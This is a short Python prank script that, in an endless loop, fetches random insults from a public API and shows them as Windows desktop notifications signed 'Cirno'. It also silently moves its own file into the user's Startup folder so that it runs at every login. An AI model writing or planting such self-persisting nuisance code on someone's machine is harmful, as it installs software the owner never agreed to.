import plyer as plr
import requests
import time
import random as rnd
import os.path
from os import path
import shutil

maso = True

p = os.path.dirname(__file__)
pn = p.replace("\\", "/" )

maso = True

userp = os.path.expanduser('~')
startup = rf'{userp}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
file = rf'{pn}/cirno.py'

maso = True

while(maso):
    timer = rnd.randint(1800,7200)
    r = requests.get('https://insult.mattbas.org/api/insult')
    plr.notification.notify(
        title='Cirno says:',
        message=r.text,
        app_icon='fumo.ico',
        timeout=10,
    )

    if pn != rf'{userp}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup':
        try:
            shutil.move(file, startup)
        except WindowsError:
            pass

    time.sleep(timer)





